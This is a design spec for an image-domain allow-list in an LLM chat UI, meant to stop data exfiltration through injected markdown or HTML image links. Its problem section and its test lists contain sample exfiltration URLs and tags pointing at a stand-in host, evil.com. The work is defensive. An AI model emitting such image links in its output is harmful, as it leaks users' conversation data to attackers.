# Spec: Image Allow-List for LLM Output (EPMCDME-12950)

## Problem

The CodeMie UI renders images in LLM-generated markdown output without domain validation. An attacker can inject markdown image links pointing to attacker-controlled domains; when the browser loads those images it issues an HTTP request to an attacker-controlled URL. Sensitive data — conversation content, identifiers, or other context — can be encoded into the URL itself (e.g. `https://evil.com/log?d=<content>`). The mere fact of the request with a unique URL is sufficient for exfiltration; no credentials need to be forwarded. This is the reason domain blocking is the correct fix, not credential stripping.

A second, independent path in `ThoughtMessage.tsx` renders structured `image_url` segments from parsed JSON as bare `<img src={segment.url}>` with no validation.

## Goals

- Enforce a configurable allow-list of trusted image domains across all image render paths in LLM output.
- Block-by-default: when the allow-list is empty or unset, only same-origin and backend-origin images are allowed.
- Blocked images render an inline badge showing the blocked hostname; no `<img>` tag is emitted, so no network request is made.
- The block is verifiable in browser dev tools (no outbound request appears in the Network tab).
- The allow-list is configurable at deployment time without a rebuild, via `VITE_ALLOWED_IMAGE_DOMAINS`.

## Out of Scope

- CSP `img-src` headers (no `vite.config.ts` or nginx change in this ticket; the React-layer block satisfies the acceptance criteria).
- Backend-driven allow-list via `appInfoStore` (env-var approach satisfies AC1; backend-driven config is a future enhancement).

---

## Architecture

Two new files share responsibilities along the `src/utils/` vs. `src/components/` boundary the codebase enforces: policy and HTML-string rendering live in a utility module; the React component lives under components.

`getMarkdownRenderer()` is consumed by `MarkdownTokens.tsx`, which is used by every `<Markdown>` component in the codebase. Eight consumers go through this path:

| Consumer | Context |
|----------|---------|
| `ChatAiMessage` | AI chat responses |
| `ThoughtMessage` (markdown thought path) | Agent thought messages |
| `EditOutputForm` | Editable output area |
| `TermsAndConditionsPage` | T&C content rendered from markdown |
| `WorkflowStateOutput` | Workflow execution output |
| `ContinueWithInputPopup` | Continuation input popups |
| `KataDetailView` (line 326) | Kata detail descriptions |
| `StepByStepNavigator` | Step-by-step content |

Under default-deny, any external image embedded in T&C text, kata content, or workflow output will render as a blocked badge rather than an image. **Pre-merge requirement**: audit whether T&C text or kata content currently references external images. If they do, those hostnames must be added to a seeded default in `VITE_ALLOWED_IMAGE_DOMAINS` (or the content updated), or AC5 (no regression) fails on those pages.

```
src/utils/imageAllowList.ts                                    ← new; policy + HTML-string badge + shared label/class
                                                                 + sanitizeHtmlWithImageAllowList (DOMPurify hook)
src/components/BlockedImageBadge/BlockedImageBadge.tsx         ← new; React component; imports label/class from utils
src/components/markdown/Markdown.utils.ts                      ← patch: renderer.image override + markdown2html sanitize
src/utils/messageHelpers.ts                                    ← patch: identical renderer.image override + sanitize
src/components/Thought/ThoughtMessage.tsx                      ← patch: segment.type === 'image' guard
src/components/form/MarkdownEditor/MarkdownEditor.tsx          ← patch: custom img component guard
src/types/global.ts                                            ← add VITE_ALLOWED_IMAGE_DOMAINS to EnvConfig
config.js                                                      ← add key with empty default (repo root)
deploy-templates/values.yaml                                   ← add viteAllowedImageDomains key
deploy-templates/templates/configmap.yaml                      ← add conditional VITE_ALLOWED_IMAGE_DOMAINS block
deploy-templates/tests/configmap_test.yaml                     ← add rendered/not-rendered test cases
README.md                                                      ← add to .env example block + short subsection
```

Both new files require the project Apache 2.0 license header (enforced by the pre-commit hook).

---

## `src/utils/imageAllowList.ts`

### Unexported internals

**`parseImageUrl(src: string): URL | undefined`**

The single internal URL parser for the module. Every other helper that needs a `URL` object calls this; no other function in the module calls `new URL()` directly.

```
try { return new URL(src, window.location.href) } catch { return undefined }
```

**`extractHostname(src: string): string | undefined`**

Thin wrapper over `parseImageUrl`. Returns the parsed hostname, or `undefined` on parse failure or blank input. Used by the badge functions to fall back to a hostname-less label when the source URL is malformed or empty.

```
if (!src.trim()) return undefined
return parseImageUrl(src)?.hostname || undefined
```

**`parseAllowList(): Set<string>`**

Reads `window?._env_?.VITE_ALLOWED_IMAGE_DOMAINS || import.meta.env.VITE_ALLOWED_IMAGE_DOMAINS`. Splits on `,`, trims whitespace, lowercases, and drops empty entries. Returns a `Set<string>`. Not cached at module level (the `window._env_` object can be replaced at runtime in tests and some deployment patterns).

**`getBackendOrigin(): string | null`**

```
return parseImageUrl(api.BASE_URL)?.origin ?? null
```

Reads from `api.BASE_URL` directly (which already applies the `window?._env_?.VITE_API_URL || import.meta.env.VITE_API_URL` fallback chain). Does not re-read `VITE_API_URL` itself. Works for both the local relative path (`/api`) and the production absolute URL (`https://codemie.%%DOMAIN%%/code-assistant-api`).

### Exports

**`BLOCKED_IMAGE_BADGE_CLASS: string`**

Single CSS class string shared by both `getBlockedImageBadgeHTML` (in this module) and `BlockedImageBadge` (in `src/components/BlockedImageBadge/BlockedImageBadge.tsx`). Changing the badge appearance requires editing exactly one constant.

**`BLOCKED_IMAGE_BADGE_TITLE: string`**

`'Image not displayed: domain is not on the allow-list'` — shared title attribute string used by both `getBlockedImageBadgeHTML` and `BlockedImageBadge`. Neither form hardcodes this string; both read this constant.

**`getBlockedImageLabel(hostname?: string): string`**

```
hostname ? `Image from ${hostname} blocked` : 'Image from untrusted domain blocked'
```

Used as the visible text by both badge forms. When `hostname` is `undefined` (malformed or non-`data:` non-HTTP URL), the fallback label is rendered. For a blank `src`, neither badge form renders visible content — see `getBlockedImageBadgeHTML` below.

**`getBlockedImageBadgeHTML(src: string): string`**

HTML-string badge for the two `marked` renderer paths (which must return strings, not JSX). Calls `extractHostname(src)` internally. If `src` is blank (trimmed empty), returns an empty string — a blank src is a malformed token, not a blocked image, and rendering a badge label for it would be inaccurate. HTML-escapes the hostname before inserting it into attributes and label text. Includes:
- `class="${BLOCKED_IMAGE_BADGE_CLASS}"`
- `data-blocked-image-hostname="${escapedHostname}"` (omitted when hostname is undefined)
- `title="${BLOCKED_IMAGE_BADGE_TITLE}"`

**`isImageAllowed(src: string): boolean`**

`src` is trimmed once on entry (`src = src.trim()`). This ensures `data:image/...` values with leading whitespace match tier 2 after trim, and that `new URL('', location.href)` is never reached from a whitespace-only src.

Tier order — first match wins. `parseImageUrl` is called once in tier 3 and its result is used by all subsequent tiers.

| Tier | Condition | Decision | Rationale |
|------|-----------|----------|-----------|
| 1 | `src` is empty after trim | **blocked** | `new URL('', location.href)` resolves to the current page; an empty `src` on `<img>` causes browsers to re-request the current URL. |
| 2 | `src` matches `/^data:image\//i` | **allowed** | `data:image/*` (including `data:image/svg+xml`) issues no network request. Browsers render `<img>`-sourced SVG in secure static mode — scripts are disabled and external fetches are blocked. `data:image/svg+xml` is explicitly safe. Non-image data URIs (e.g. `data:text/html`) do **not** match and fall through to tier 3 where they are blocked by scheme. |
| 3 | `parseImageUrl(src)` returns `undefined` | **blocked** | Malformed URL; no safe interpretation. |
| 4 | Scheme is `blob:` or anything other than `https:` or `http:` | **blocked** | Only HTTPS remote URLs are accepted. Protocol-relative URLs (e.g. `//evil.com/x.png`) are resolved by `new URL()` to `https:` or `http:` inheriting the page scheme — they pass tier 4, pass tier 5, and are blocked at tier 8 (empty list) or the final default-block (non-empty list where the hostname is absent). |
| 5 | Scheme is `http:` and `window.location.hostname` is not `localhost` or `127.0.0.1` | **blocked** | HTTP is only permitted when the page itself is running locally. Gating on the page hostname — not the image hostname — prevents prompt-injected content from probing the user's local services (`http://localhost:8080/admin`) on an HTTPS production page. Mixed-content blocking would stop most such probes, but the design does not rely on it. |
| 6 | `url.origin === window.location.origin` | **allowed** | Same-origin; covers `/api/v1/files/…` in local dev where `VITE_API_URL='/api'`. |
| 7 | `url.origin === getBackendOrigin()` | **allowed** | Backend origin; covers `https://codemie.%%DOMAIN%%/code-assistant-api/v1/files/…` in production when `VITE_API_URL` is an absolute URL. Tier 7 trusts the entire backend origin (not just the `/v1/files/` path) — this is a conscious, documented choice. |
| 8 | `parseAllowList().size === 0` | **blocked** | Default-deny: empty allow-list blocks all external images. |
| 9 | Hostname matches an entry in the allow-list | **allowed** | See matching rules below. |
| — | (no tier matched) | **blocked** | |

**Allow-list entry matching rules:**

- Entries are stored lowercased and trimmed; `url.hostname` is already lowercased by the `URL` API.
- Exact match: `hostname === entry` (e.g., entry `cdn.example.com` matches only `cdn.example.com`).
- Subdomain wildcard: entries beginning with `.` match the apex domain and all subdomains. For entry `.example.com`: allowed if `hostname === 'example.com'` OR `hostname.endsWith('.example.com')`. The `endsWith` check is safe: `evil-example.com` ends with `-example.com` (not `.example.com`) and is rejected; `example.com.evil.io` does not end with `.example.com` and is rejected.
- Operators must use entries with at least two domain labels (e.g., `.example.com`, not `.com`). Single-label wildcards are syntactically valid but match far too broadly and are not supported.

---

## `src/components/BlockedImageBadge/BlockedImageBadge.tsx`

React component for JSX render paths (`ThoughtMessage`, `MarkdownEditor`). Imports `BLOCKED_IMAGE_BADGE_CLASS` and `getBlockedImageLabel` from `src/utils/imageAllowList.ts` so both badge forms share one label and one class source.

Calls `extractHostname(src)` (also imported from the utils module). If `src` is blank (trimmed empty), returns `null` — same policy as `getBlockedImageBadgeHTML` for blank src. Renders:

```jsx
<span
  className={BLOCKED_IMAGE_BADGE_CLASS}
  data-blocked-image-hostname={hostname}
  title={BLOCKED_IMAGE_BADGE_TITLE}
>
  {getBlockedImageLabel(hostname)}
</span>
```

The drift-prevention test asserts the component's rendered HTML equals `getBlockedImageBadgeHTML(src)` output for a non-blank src, ensuring the two forms never silently diverge.

---

## Four Render Path Patches

### `Markdown.utils.ts` and `messageHelpers.ts` (identical change in both)

In `getMarkdownRenderer()`, capture and bind the default renderer before overriding:

```typescript
const imageRenderer = renderer.image.bind(renderer)
renderer.image = (href: string, title: string | null, text: string): string =>
  isImageAllowed(href) ? imageRenderer(href, title, text) : getBlockedImageBadgeHTML(href)
```

Binding is required: `marked` 4.3.0's `Renderer.image` reads `this.options` (see `marked.cjs:1957` and `:1965`). Without `.bind(renderer)`, the method is called with `this === undefined` in strict-mode ES modules, causing `TypeError: Cannot read properties of undefined (reading 'sanitize')`. The existing `tableRenderer` and `codespanRenderer` captures happen to work without binding only because those methods do not access `this`.

**Copy-message behavior change:** `markdown2html` (used by `ChatAiMessageActions.tsx:67` for "Copy message") also calls `getMarkdownRenderer()`. As a result, markdown image tokens from blocked domains now produce badge `<span>` elements in the clipboard HTML rather than `<img>` tags. This is the correct and desired outcome — blocked images should not load when the user pastes into an email. QA should expect badge spans, not `<img>` tags, in copied HTML for messages containing blocked images.

Both `markdown2html` implementations must additionally replace their `DOMPurify.sanitize(text)` call with `sanitizeHtmlWithImageAllowList(text)` — see "Copy-message raw-HTML path" below. The renderer override alone covers only markdown image tokens; the DOMPurify step is what covers raw HTML tags.

### `ThoughtMessage.tsx`

Replace the bare `<img>` at lines 131–142 with a guarded branch:

```jsx
{segment.type === 'image' && (
  isImageAllowed(segment.url)
    ? <img
        src={segment.url}
        alt={segment.alt}
        className="max-w-full h-auto rounded-lg border border-border-structural shadow-sm"
        style={{ maxHeight: 400, objectFit: 'contain' }}
        onError={(e) => {
          ;(e.target as HTMLImageElement).style.display = 'none'
          console.error('Failed to load image:', segment.url.substring(0, 50) + '...')
        }}
      />
    : <BlockedImageBadge src={segment.url} />
)}
```

The existing `onError` hide is preserved on the allowed branch. A load failure is not a policy block; the two concerns are kept separate.

### `MarkdownEditor.tsx`

The `react-markdown` custom `img` component at line 343. The `src = ''` default makes a blank src directly reachable — `isImageAllowed('')` returns `false` at tier 1, and `BlockedImageBadge` returns `null` for blank src, so nothing is rendered.

```jsx
img: ({ src = '' }) =>
  isImageAllowed(src) ? <img src={src} … /> : <BlockedImageBadge src={src} />
```

---

## Configuration

### `src/types/global.ts`

Add to `EnvConfig`:

```typescript
VITE_ALLOWED_IMAGE_DOMAINS?: string
```

### `config.js` (repo root)

Add after the `VITE_MCP_AUTH_ORIGIN` line:

```js
window._env_.VITE_ALLOWED_IMAGE_DOMAINS = ''
```

### `.env`

Add:

```
# Comma-separated image domain allow-list for LLM output.
# Empty = block all external images (only same-origin and backend-origin are allowed).
# Exact match: cdn.example.com. Subdomain wildcard: .example.com (matches example.com and sub.example.com).
# Entries must have at least two domain labels; single-label entries (e.g. .com) are not supported.
VITE_ALLOWED_IMAGE_DOMAINS=''
```

### `deploy-templates/values.yaml`

Add after `viteMcpAuthOrigin`:

```yaml
# -- Comma-separated allow-list of trusted image domains for LLM output rendering.
# Empty = block all external images. Supports exact hostname and leading-dot subdomain wildcards.
# Entries must have at least two domain labels. Example: "cdn.example.com,.trusted.io"
viteAllowedImageDomains: ""
```

### `deploy-templates/templates/configmap.yaml`

Add after the `viteMcpAuthOrigin` block:

```yaml
      {{- if .Values.viteAllowedImageDomains }}
      VITE_ALLOWED_IMAGE_DOMAINS: "{{ .Values.viteAllowedImageDomains }}",
      {{- end }}
```

### `deploy-templates/tests/configmap_test.yaml`

Add two test cases after the `viteMcpAuthOrigin` tests:

```yaml
  - it: should not render VITE_ALLOWED_IMAGE_DOMAINS when viteAllowedImageDomains is not set
    asserts:
      - notMatchRegex:
          path: data["config.js"]
          pattern: 'VITE_ALLOWED_IMAGE_DOMAINS'

  - it: should render VITE_ALLOWED_IMAGE_DOMAINS when viteAllowedImageDomains is set
    set:
      viteAllowedImageDomains: "cdn.example.com,.trusted.io"
    asserts:
      - matchRegex:
          path: data["config.js"]
          pattern: 'VITE_ALLOWED_IMAGE_DOMAINS: "cdn\.example\.com,\.trusted\.io"'
```

### `README.md`

Add `VITE_ALLOWED_IMAGE_DOMAINS=''` to the existing `.env` example block (lines 85–90). Below the block, add a short subsection documenting the variable: purpose (domain allow-list for LLM output images), default behaviour (empty = block all external), format (comma-separated hostnames, leading-dot subdomain wildcards), and the two-label minimum rule.

---

## Copy-message raw-HTML path

`markdown2html` runs `marked.parse(<sanitized text>, { renderer: getMarkdownRenderer(), ... })`. It is used for clipboard copy in `ChatAiMessageActions.tsx:67`, which passes the raw LLM response (`message.response`).

The `renderer.image` override fires only for markdown image tokens (`![alt](url)`). A raw HTML `<img>` in LLM content is not tokenized by `marked` as an image — it passes through as raw HTML. The display pipeline is safe from this because `getMarkdownTokens()` calls `sanitizeMessage()`, which escapes `<` and `>` into entities before tokenization, so raw tags can never become live elements. `markdown2html` skips `sanitizeMessage` and relies on DOMPurify instead, and DOMPurify's default config permits `<img>` — so a raw `<img src="https://evil.com/x.png">` would survive into the clipboard HTML and load when the user pasted into a rich-text editor such as an email client.

**Resolution:** both `markdown2html` implementations sanitize through `sanitizeHtmlWithImageAllowList()` (in `src/utils/imageAllowList.ts`) instead of calling `DOMPurify.sanitize()` directly. That function registers a scoped `afterSanitizeAttributes` DOMPurify hook, sanitizes, and removes the hook in a `finally` block so no global DOMPurify state leaks to the app's other `sanitize()` call sites.

The hook applies `isImageAllowed` to every attribute DOMPurify allows by default that makes the browser fetch an image — `src`, `srcset`, `poster`, `background` — and acts on the element by kind:

| Element | Action when a blocked URL is found |
|---------|-----------------------------------|
| `<img>` | Replaced with the same blocked-image badge `<span>` the markdown renderer emits, so the token path and the raw-HTML path produce identical clipboard output. An `<img>` with a blank `src` is removed outright rather than replaced by an empty badge. |
| `<source>` | Removed. It has no standalone rendering, and the `<img>` fallback inside `<picture>` is evaluated on its own. |
| Any other element | Only the offending attributes are removed (e.g. `poster` on `<video>`, `background` on `<table>`); the element itself is kept. |

`srcset` is parsed as a comma-separated candidate list and each candidate URL is checked; a single blocked candidate blocks the whole element. A `data:` URL containing a comma inside a `srcset` therefore splits into fragments that fail to parse and is blocked — a conservative failure that matches the feature's default-deny posture.

`FORBID_TAGS: ['img']` was rejected as the fix: it would also strip allowed images from the clipboard HTML, regressing the copy feature for legitimate content.

**Note on threat model:** this path was rated low severity because our page never issues the request — the user's mail client does, after paste. It is fixed in this ticket anyway so that the allow-list holds across every place a message can leave the app.

---

## Testing

### `src/utils/__tests__/imageAllowList.test.tsx`

File is `.tsx` because the drift-prevention assertion renders `<BlockedImageBadge>` with React Testing Library.

`isImageAllowed`:
- Empty string → blocked (tier 1)
- Whitespace-only string → blocked (tier 1)
- `data:image/png;base64,…` → allowed (tier 2)
- `data:image/svg+xml;…` → allowed (tier 2)
- `data:image/png` with leading whitespace → **allowed** (trimmed at entry; tier 2 regex matches)
- `data:text/html;base64,…` → blocked (does not match tier 2; tier 3 parses OK; tier 4 blocks non-http(s) scheme)
- Malformed string → blocked (tier 3)
- `blob:https://…` → blocked (tier 4)
- `//evil.com/x.png` → blocked (resolves to `https://evil.com/x.png`; passes tier 4; fails to match tiers 5–7; blocked at tier 8 or final block)
- `http://evil.com/img.png` on an HTTPS production page → blocked (tier 5: page hostname is not localhost)
- `http://localhost/img.png` on a local page → allowed (tier 5: page hostname is localhost)
- `http://127.0.0.1/img.png` on a local page → allowed (tier 5: page hostname is 127.0.0.1)
- `http://localhost/img.png` on a production page (page hostname is not localhost) → blocked (tier 5)
- Same-origin relative URL → allowed (tier 6)
- Same-origin absolute URL → allowed (tier 6)
- Absolute `api.BASE_URL` origin matching image URL origin → allowed (tier 7; mocks `api.BASE_URL` to an absolute URL)
- Empty `VITE_ALLOWED_IMAGE_DOMAINS` → external `https://` URL blocked (tier 8)
- Exact match in list → allowed (tier 9)
- Leading-dot wildcard `.example.com` matches `example.com` → allowed
- Leading-dot wildcard `.example.com` matches `sub.example.com` → allowed
- Leading-dot wildcard `.example.com` rejects `evil-example.com` → blocked
- Leading-dot wildcard `.example.com` rejects `example.com.evil.io` → blocked
- List entry with extra whitespace and mixed case is normalized → match succeeds

Badge:
- `getBlockedImageBadgeHTML('https://evil.com/img.png')` contains `data-blocked-image-hostname="evil.com"`, `title="…"`, and the label text
- `getBlockedImageBadgeHTML('')` returns empty string (blank src)
- `getBlockedImageBadgeHTML` HTML-escapes a hostname containing `<script>` → no raw `<` in output
- Drift-prevention: render `<BlockedImageBadge src="https://evil.com/img.png">` and call `getBlockedImageBadgeHTML('https://evil.com/img.png')`; parse both results into DOM nodes and assert equal `tagName`, `className`, `dataset.blockedImageHostname`, `title`, and `textContent` — structural comparison, not string equality, so attribute-ordering differences in React's serialiser never cause false failures
- `data-blocked-image-hostname` survives `DOMPurify.sanitize(getBlockedImageBadgeHTML(src), { ADD_ATTR: ['target'] })` — verifies `ALLOW_DATA_ATTR` default keeps the attribute
- Malformed src → badge renders with no `data-blocked-image-hostname` attribute; label uses fallback text

`sanitizeHtmlWithImageAllowList` (all cases use a production page stub and `cdn.trusted.com` on the allow-list):
- Raw `<img src="https://evil.com/x.png">` → replaced by a badge `<span>` carrying `data-blocked-image-hostname="evil.com"`, the shared title, and the hostname label; no `<img>` in output
- Raw `<img src="https://cdn.trusted.com/x.png">` → `<img>` kept with its `src` intact, no badge
- `<img>` with allowed `src` but a `srcset` containing an `evil.com` candidate → blocked; the badge names the blocked candidate's hostname, not the allowed `src`
- `<img>` whose `srcset` candidates are all allowed → `srcset` kept verbatim
- `<picture><source srcset="https://evil.com/x.png"><img src="<allowed>"></picture>` → `<source>` removed, `<img>` fallback kept
- `<video poster="https://evil.com/p.png">` → `poster` stripped, element kept
- `<table background="https://evil.com/b.png">` → `background` stripped, element kept
- `<video poster="https://cdn.trusted.com/p.png">` → `poster` kept
- `<img src="">` inside text → element dropped entirely, no empty badge emitted, surrounding text preserved
- `<script>alert(1)</script>` still removed — the wrapper does not weaken baseline DOMPurify behavior
- After a call, a plain `DOMPurify.sanitize('<img src="https://evil.com/x.png">')` still returns the `<img>` — proves the hook is removed and no global DOMPurify state leaks

### `src/components/BlockedImageBadge/__tests__/BlockedImageBadge.test.tsx`

- `<BlockedImageBadge src="">` renders nothing (returns null)
- `<BlockedImageBadge src="https://evil.com/img.png">` renders the badge with correct hostname, class, title, and label

### `src/components/markdown/__tests__/Markdown.utils.test.ts`

- Allowed image URL → `renderer.image` delegates to captured `imageRenderer` and returns `<img>` HTML
- Blocked image URL → returns `getBlockedImageBadgeHTML` output
- `imageRenderer` is called with `this` bound correctly (no TypeError on `.sanitize` access)
- `markdown2html('<img src="https://evil.com/img.png">')` → badge, no `<img>` (raw-HTML copy path)
- `markdown2html('<img src="https://cdn.trusted.com/img.png">')` → `<img>` kept, no badge

The same two `markdown2html` raw-HTML cases are covered for the `messageHelpers.ts` copy in `src/utils/__tests__/messageHelpers.renderer.test.ts`.

### `src/components/markdown/__tests__/MarkdownTokens.test.tsx`

- Markdown string `![alt](https://allowed.example.com/img.png)` with `allowed.example.com` in allow-list → `<img>` in rendered output
- Markdown string `![alt](https://evil.com/img.png)` with empty allow-list → badge in rendered output, no `<img>` tag
- Full path: badge HTML passes through `DOMPurify.sanitize(…, { ADD_ATTR: ['target'] })` and `data-blocked-image-hostname` is present in the final rendered DOM

### `src/components/Thought/__tests__/ThoughtMessage.test.tsx`

- `segment.type === 'image'` with allowed URL → `<img>` rendered
- `segment.type === 'image'` with blocked URL → `<BlockedImageBadge>` rendered, no `<img>` tag
- `onError` handler on the allowed-path `<img>` still hides the image on load failure (existing behavior not regressed)

---

## Acceptance Criteria Mapping

| AC | How satisfied |
|----|---------------|
| Configurable allow-list | `VITE_ALLOWED_IMAGE_DOMAINS` via `window._env_` (runtime, no rebuild); documented key in `values.yaml` and `configmap.yaml` |
| UI enforces the allow-list | All four render paths check `isImageAllowed` before emitting any `<img>` tag; all eight `<Markdown>` consumers inherit the fix through `getMarkdownRenderer()` |
| No network request for blocked domains | Blocked path emits a `<span>` badge or nothing, never an `<img>` tag; no `src` is set. The "Copy message" HTML is covered too: `sanitizeHtmlWithImageAllowList` strips blocked `src`/`srcset`/`poster`/`background` from raw HTML, so a pasted message issues no request either |
| Blocking verifiable via dev tools | Absence of outbound image requests in Network tab; badge in DOM with `data-blocked-image-hostname` attribute |
| No regression for allowed domains | Tiers 2, 6, 7 allow `data:image/*`, same-origin, and backend-origin; tier 9 allow-lists external domains. **Pre-merge**: audit T&C and kata content for external image URLs |
| Documentation | `values.yaml` comment, `.env` comment, and README subsection (operator-facing); this spec (internal) |
